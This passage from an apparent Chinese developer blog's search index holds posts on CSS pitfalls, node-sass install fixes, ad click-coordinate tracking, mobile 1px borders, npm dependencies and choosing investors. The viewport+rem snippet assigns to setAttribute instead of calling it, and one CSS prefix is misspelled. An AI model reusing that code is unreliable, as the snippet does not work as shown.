<p>当前一些域名的注册平台，会引导新手进行网站备案，当你发现网站备案需要有云服务器，这时又会引导你去购买云服务器。</p>
</blockquote>
<p><a href="https://cloud.tencent.com/document/product/243">更多详见</a></p>
<h2 id="备案成功后"><a href="#备案成功后" class="headerlink" title="备案成功后"></a>备案成功后</h2><p><a href="https://cloud.tencent.com/document/product/243/61412">详见</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://docs.github.com/cn/pages">GitHub Pages</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>域名</tag>
        <tag>备案</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS踩坑记录</title>
    <url>/2022/04/02/20220402-CSS%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>工作中经常会遇到 css 问题，各种 bug 出的很奇妙，就记录了下来，以便往后避免再次踩坑。</p>
<span id="more"></span>

<p>样式兼容性问题，可通过<a href="https://caniuse.com/">caniuse 官网</a>查询。</p>
<h2 id="uniapp-中使用-calc-计算"><a href="#uniapp-中使用-calc-计算" class="headerlink" title="uniapp 中使用 calc 计算"></a>uniapp 中使用 calc 计算</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 错误写法 */</span></span><br><span class="line"><span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">100vh</span>-<span class="number">100</span>rpx);</span><br><span class="line"><span class="comment">/* 正确写法 */</span></span><br><span class="line"><span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">100vh</span> - <span class="number">100</span>rpx);</span><br></pre></td></tr></table></figure>

<p>calc 需要在计算符号前后加空格，并且它是支持多个不同单位计算的。</p>
<p>了解更多，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/calc">详见</a></p>
<h2 id="父级元素高度没有自适应子元素高度"><a href="#父级元素高度没有自适应子元素高度" class="headerlink" title="父级元素高度没有自适应子元素高度"></a>父级元素高度没有自适应子元素高度</h2><p>一般相对定定位、绝对定位会出现。</p>
<p>子元素相对定位，如果 top &gt; 0，父元素会缺失 top 值这部分高度，如果 top &lt; 0，父元素会多出 top 值这部分高度。</p>
<p>子元素绝对定位，父元素会缺失子元素的高度。</p>
<p>如果父元素的高度比子元素最高的高度高出 top 值，滚动到底部时，会发现，多了 top 值高度，这对设置了不同背景色的盒子来说，不符合 UI 设计，可以用父元素可以用<code>height: 100vh</code>消除多余的 top 值。</p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>你的node-sass安装报错了吗</title>
    <url>/2022/04/14/20220414-%E4%BD%A0%E7%9A%84node-sass%E5%AE%89%E8%A3%85%E6%8A%A5%E9%94%99%E4%BA%86%E5%90%97/</url>
    <content><![CDATA[<p>如何解决node-sass安装失败问题？我们从npm安装包的原理出发。</p>
<span id="more"></span>

<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>当我们在 VSCode IDE 或其他编辑器中，项目所在目录下执行<code>npm i</code>，可能安装 node-sass 包时会报错(项目需用到 node-sass 的情况)</p>
<p><img src="https://cdn.huatree.top/image-20220414170239182.png" alt="image-20220414170239182"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>报错给了提示，图中的这段信息告诉我们，我当时开发环境安装的 node-sass 中 win32-x64-64 目录下 <code>binding.node</code> 这个文件失效，需要下载替换。</p>
<h3 id="手动替换文件"><a href="#手动替换文件" class="headerlink" title="手动替换文件"></a>手动替换文件</h3><p>可以在 Github 中下载<a href="https://github.com/sass/node-sass/releases">node-sass 的 binary 对应版本文件</a>来替换。</p>
<p>比如我报错信息上是<strong>win32-x64-64</strong>版本，那我就找到该版本下载：</p>
<p><img src="https://cdn.huatree.top/image-20220414165653097.png" alt="image-20220414165653097"></p>
<p>该文件下载成功后，替换掉报错提示的缓存目录下的文件</p>
<p><img src="https://cdn.huatree.top/image-20220414170424379.png" alt="image-20220414170424379"></p>
<p>再次 VSCode IDE 或其他编辑器中，项目所在目录下执行<code>npm i</code>，此时已成功安装 node-sass 包。</p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>node-sass</tag>
      </tags>
  </entry>
  <entry>
    <title>H5页面中获取点击坐标信息</title>
    <url>/2022/04/06/20220406-H5%E9%A1%B5%E9%9D%A2%E4%B8%AD%E8%8E%B7%E5%8F%96%E7%82%B9%E5%87%BB%E5%9D%90%E6%A0%87%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p>广告位埋点需求：H5 页面中记录广告区域内的点击坐标信息。</p>
<p>● etStart 按下时间 时间戳</p>
<p>● downX 按下相对屏幕 x 坐标</p>
<p>● downY 按下相对屏幕 y 坐标</p>
<p>● rDownX 按下相对广告 x 坐标</p>
<p>● rDownY 按下相对广告 y 坐标</p>
<p>● etEnd 抬起时间 时间戳</p>
<p>● upX 抬起相对屏幕 x 坐标</p>
<p>● upY 抬起相对屏幕 y 坐标</p>
<p>● rUpX 抬起相对广告 x 坐标</p>
<p>● rUpY 抬起相对屏幕 y 坐标</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> adE = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;ad&#x27;</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="language-javascript">  adE.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousedown&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">etStart</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()</span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">downX</span> = e.<span class="property">screenX</span></span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">downY</span> = e.<span class="property">screenY</span></span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">rDownX</span> = e.<span class="property">offsetX</span></span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">rDownY</span> = e.<span class="property">offsetY</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">  adE.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseup&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">etEnd</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()</span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">upX</span> = e.<span class="property">screenX</span></span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">upY</span> = e.<span class="property">screenY</span></span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">rUpX</span> = e.<span class="property">offsetX</span></span></span><br><span class="line"><span class="language-javascript">    adCoord.<span class="property">rUpY</span> = e.<span class="property">offsetY</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> closeE = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;close&#x27;</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="language-javascript">  closeE.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousedown&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">etStart</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()</span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">downX</span> = e.<span class="property">screenX</span></span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">downY</span> = e.<span class="property">screenY</span></span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">rDownX</span> = e.<span class="property">pageX</span> - closeE.<span class="property">offsetParent</span>.<span class="property">offsetLeft</span></span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">rDownY</span> = e.<span class="property">pageY</span> - closeE.<span class="property">offsetParent</span>.<span class="property">offsetTop</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">  closeE.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseup&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">etEnd</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()</span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">upX</span> = e.<span class="property">screenX</span></span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">upY</span> = e.<span class="property">screenY</span></span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">rUpX</span> = e.<span class="property">pageX</span> - closeE.<span class="property">offsetParent</span>.<span class="property">offsetLeft</span></span></span><br><span class="line"><span class="language-javascript">    closeCoord.<span class="property">rUpY</span> = e.<span class="property">pageY</span> - closeE.<span class="property">offsetParent</span>.<span class="property">offsetTop</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://developer.mozilla.org/zh-CN/docs/Web/Events">Web 开发技术 &gt; 事件参考</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>H5</tag>
      </tags>
  </entry>
  <entry>
    <title>移动端1px问题</title>
    <url>/2022/04/18/20220418-%E7%A7%BB%E5%8A%A8%E7%AB%AF1px%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><h3 id="UI设计稿"><a href="#UI设计稿" class="headerlink" title="UI设计稿"></a>UI设计稿</h3><p>移动端H5开发中，UI设计稿中边框为1px，前端在开发过程中如果出现border:1px（或width: 1px，height: 1px，…），测试会发现在HiDPI或Retina屏机型中，1px会比较粗。</p>
<h3 id="设备像素比"><a href="#设备像素比" class="headerlink" title="设备像素比"></a>设备像素比</h3><p>设备像素比：<code>dpr=window.devicePixelRatio</code>，也就是设备的物理像素与逻辑像素的比值，它告诉浏览器应使用多少屏幕实际像素来绘制单个CSS像素。</p>
<p>在HiDPI或Retina屏的手机上, <code>dpr</code>常见的有<code>2</code>或<code>3</code>，<code>css</code>里写的<code>1px</code>宽度映射到物理像素上就有<code>2px</code>或<code>3px</code>宽度。</p>
<p>例如：<code>iPhone6</code>的<code>dpr</code>为<code>2</code>，物理像素是<code>750</code>（<code>x</code>轴）,它的逻辑像素为<code>375</code>。也就是说，<code>1</code>个逻辑像素，在<code>x</code>轴和<code>y</code>轴方向，需要2个物理像素来显示，即：dpr&#x3D;2时，表示1个CSS像素由4个物理像素点组成。</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy96ZXdyTGtyWWZzUFNmTkZJSU1KZnVzTWt3OHpNbFlTbEwzVXdXUWdMTXdjVGVWTDZLTVBGbjAyZ1dTMFc1RjBraWN3SUNWbUFpYVdyZ0hBR1c3b1dqQ2FnLzY0MA?x-oss-process=image/format,png" alt="img-01"></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="伪类-transform"><a href="#伪类-transform" class="headerlink" title="伪类+transform"></a>伪类+transform</h3><p>移动端京东处理1px有用到<code>伪类+transform</code></p>
<blockquote>
<p>tips</p>
<p>伪类+transform可以很好的解决部分手机不支持<code>.5px</code>显示问题，关键是利用好<code>scale()</code>。</p>
</blockquote>
<p>优点：所有场景都能满足，支持圆角(伪类和本体类都需要加border-radius)。<br>缺点：代码量也很大，对于已经使用伪类的元素(例如clearfix)，可能需要多层嵌套。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 手机端实现真正的1px边框 */</span></span><br><span class="line"><span class="selector-class">.border-1px</span>, </span><br><span class="line"><span class="selector-class">.border-bottom-1px</span>, </span><br><span class="line"><span class="selector-class">.border-top-1px</span>, </span><br><span class="line"><span class="selector-class">.border-left-1px</span>, </span><br><span class="line"><span class="selector-class">.border-right-1px</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 线条颜色 */</span></span><br><span class="line"><span class="selector-class">.border-1px</span><span class="selector-pseudo">::after</span>,</span><br><span class="line"><span class="selector-class">.border-bottom-1px</span><span class="selector-pseudo">::after</span>, </span><br><span class="line"><span class="selector-class">.border-top-1px</span><span class="selector-pseudo">::after</span>, </span><br><span class="line"><span class="selector-class">.border-left-1px</span><span class="selector-pseudo">::after</span>, </span><br><span class="line"><span class="selector-class">.border-right-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#e9e9e9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 底边边框1px */</span></span><br><span class="line"><span class="selector-class">.border-bottom-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*上边边框1px*/</span></span><br><span class="line"><span class="selector-class">.border-top-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 左边边框1px */</span></span><br><span class="line"><span class="selector-class">.border-left-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 右边边框1px */</span></span><br><span class="line"><span class="selector-class">.border-right-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 边框1px */</span></span><br><span class="line"><span class="selector-class">.border-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  -webit-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e9e9e9</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设备像素比 */</span></span><br><span class="line"><span class="comment">/* 显示屏最小dpr为2 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">-webkit-min-device-pixel-ratio</span>: <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="selector-class">.border-bottom-1px</span><span class="selector-pseudo">::after</span>, </span><br><span class="line">  <span class="selector-class">.border-top-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scaleY</span>(.<span class="number">5</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(.<span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.border-left-1px</span><span class="selector-pseudo">::after</span>, </span><br><span class="line">  <span class="selector-class">.border-right-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scaleX</span>(.<span class="number">5</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleX</span>(.<span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.border-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200%</span>;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(.<span class="number">5</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(.<span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 显示屏最小dpr为3 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">-webkit-min-device-pixel-ratio</span>: <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="selector-class">.border-bottom-1px</span><span class="selector-pseudo">::after</span>, </span><br><span class="line">  <span class="selector-class">.border-top-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scaleY</span>(.<span class="number">333</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(.<span class="number">333</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.border-left-1px</span><span class="selector-pseudo">::after</span>, </span><br><span class="line">  <span class="selector-class">.border-right-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scaleX</span>(.<span class="number">333</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleX</span>(.<span class="number">333</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.border-1px</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200%</span>;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(.<span class="number">333</span>);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(.<span class="number">333</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="viewport-rem"><a href="#viewport-rem" class="headerlink" title="viewport + rem"></a>viewport + rem</h3><p>优点：所有场景都能满足，一套代码，可以兼容基本所有布局。<br>缺点：老项目修改代价过大，只适用于新项目。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> dpr = <span class="variable language_">window</span>.<span class="property">devicePixelRatio</span> || <span class="number">1</span></span><br><span class="line">  <span class="keyword">var</span> scale = <span class="number">1</span> / dpr</span><br><span class="line">  <span class="keyword">var</span> viewport = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;meta[name=viewport]&quot;</span>)</span><br><span class="line">  viewport.<span class="property">setAttribute</span> = (<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;width=device-width,user-scalable=no,initial-scale=&#x27;</span> + scale)</span><br><span class="line">  <span class="keyword">var</span> docEl = <span class="variable language_">document</span>.<span class="property">documentElement</span></span><br><span class="line">  <span class="keyword">var</span> fontsize = docEl.<span class="property">clientWidth</span> / <span class="number">10</span> * dpr + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">  docEl.<span class="property">style</span>.<span class="property">fontSize</span> = fontsize</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<h3 id="background-image"><a href="#background-image" class="headerlink" title="background-image"></a>background-image</h3><p><code>background-image</code>跟<code>border-image</code>的方法一样，你要先准备一张符合你要求的图片。</p>
<p>优点：可以设置单条,多条边框，没有性能瓶颈的问题。<br>缺点：修改颜色麻烦, 需要替换图片；圆角需要特殊处理，并且边缘会模糊；兼容性差。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.background-image-1px</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">../img/line.png</span>) repeat-x left bottom;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">1px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="postcss-write-svg"><a href="#postcss-write-svg" class="headerlink" title="postcss-write-svg"></a>postcss-write-svg</h3><blockquote>
<p>在实际开发中，postcss-write-svg 用的很少，仅适合直线，一般不考虑。</p>
</blockquote>
<p>借助于<code>PostCSS</code>的插件<code>postcss-write-svg</code>，无需<code>background-image</code>或<code>border-image</code>的方法那样依赖图片。</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@svg</span> border1px &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="variable">@rect</span> &#123;</span><br><span class="line">    fill: var(<span class="attr">--color</span>, black);</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.example &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid transparent;</span><br><span class="line">  <span class="attribute">border-image</span>: svg(border1px param(--color <span class="number">#00b1ff</span>)) <span class="number">2</span> <span class="number">2</span> stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样<code>PostCSS</code>会自动帮你把CSS编译出来：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.example</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid transparent;</span><br><span class="line">  <span class="attribute">border-image</span>: <span class="built_in">url</span>(<span class="string">&quot;data:image/svg+xml;charset=utf-8,%3Csvg xmlns=&#x27;http://www.w3.org/2000/svg&#x27; height=&#x27;2px&#x27;%3E%3Crect fill=&#x27;%2300b1ff&#x27; width=&#x27;100%25&#x27; height=&#x27;50%25&#x27;/%3E%3C/svg%3E&quot;</span>)</span><br><span class="line">    <span class="number">2</span> <span class="number">2</span> stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通常情况，伪类元素方案更好，无论是从成本还是灵活性出发。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/devicePixelRatio">MDN - Window.devicePixelRatio</a></p>
<p>[2] <a href="https://blog.csdn.net/qq_45846359/article/details/108761345">移动端 1px 解决方案(完整版)</a></p>
<p>[3] <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta/name">MDN - 标准元数据名称</a></p>
<p>[4] <a href="https://blog.csdn.net/qq_43523725/article/details/114678995">前端提高篇（四十六）CSS进阶11：移动端布局(等比缩放+1px问题：viewport+rem | transform | vw+插件)</a></p>
<p>[5] <a href="https://github.com/csstools/postcss-write-svg">postcss-write-svg</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>如何手动加入npm依赖</title>
    <url>/2022/04/23/20220423-%E5%A6%82%E4%BD%95%E6%89%8B%E5%8A%A8%E5%8A%A0%E5%85%A5npm%E4%BE%9D%E8%B5%96/</url>
    <content><![CDATA[<p>当遇到一些特定版本的包，刚好网络暂时无法下载，又急需运行调试时，可以借助同事本地的离线包，手动加入 npm 依赖。</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>手动加入 npm 依赖操作如下：</p>
<ol>
<li>检查本地项目所在目录下的 node_modules；如果存在，先删除</li>
<li>检查 package.json 是否存在需要加入的 npm 依赖；如果是，删除</li>
<li>执行 npm i 安装依赖</li>
<li>需要加入的依赖包移入 node_modules 目录</li>
<li>package.json 中加入该 npm 依赖信息</li>
</ol>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>如何选择投资人，什么样的投资人靠谱，20个衡量指标全面分析</title>
    <url>/2022/04/25/20220425-%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E6%8A%95%E8%B5%84%E4%BA%BA%EF%BC%8C%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E6%8A%95%E8%B5%84%E4%BA%BA%E9%9D%A0%E8%B0%B1%EF%BC%8C20%E4%B8%AA%E8%A1%A1%E9%87%8F%E6%8C%87%E6%A0%87%E5%85%A8%E9%9D%A2%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><img src="http://5b0988e595225.cdn.sohucs.com/images/20180928/a7b9fa5b102a43fdb61edc28ce1fc0b1.jpeg" alt="top"></p>
<span id="more"></span>

<div class="note info"><p>文章转载自<a href="https://www.sohu.com/a/256789627_100286768?spm=smpc.author.fd-d.11.16508991429871920J6U">创投咨询网</a> </p>
</div>

<h2 id="了解投资人的背景"><a href="#了解投资人的背景" class="headerlink" title="了解投资人的背景"></a>了解投资人的背景</h2><p>如何选择投资机构。是美元机构，还是人民币机构；是一线机构，还是二线及以下的机构。但是首先应该明确一点，必须先确认公司可以拿到钱，再考虑怎么选择机构。如果公司本身融资上都有困难，那也没有什么资格挑三拣四，有机构投资就应该谢天谢地。</p>
<p>真正的核心是，创业者越聪明（不是指小聪明）、越充分准备、越抓住本质，越不会出现预期结果偏差太大（所谓被坑）的感受。</p>
<h3 id="直觉"><a href="#直觉" class="headerlink" title="直觉"></a>直觉</h3><p>无论之前创业，融资，还是现在作为投资人去投资，对于人和人沟通，个人觉得直觉还是很重要。</p>
<p>直觉是质变，之前你的理性和综合经验是量变。当然光有直觉是不行的。</p>
